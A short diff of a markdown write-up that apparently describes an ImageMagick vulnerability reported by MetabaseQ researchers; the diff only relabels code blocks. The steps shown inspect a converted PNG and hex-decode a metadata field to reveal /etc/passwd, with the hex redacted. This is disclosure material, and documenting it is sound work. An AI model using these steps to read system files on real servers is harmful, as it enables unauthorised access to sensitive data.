@@ -27,13 +27,13 @@ The researchers at [MetabaseQ](https://www.metabaseq.com/imagemagick-zero-days/)
 
 - Read contents of converted PNG file:
 
-```
+```console
 (~)>>> indentify -verbose result.png
 ```
 
 - Decode the data returned in `Raw profile type` field, you will observe the contents of `/etc/passwd`: 
 
-```
+```console
 (~)>>> python3 -c 'print(bytes.fromhex("726f6f743a783a726f6f743---REDACTED--").decode("utf-8"))'
 
 
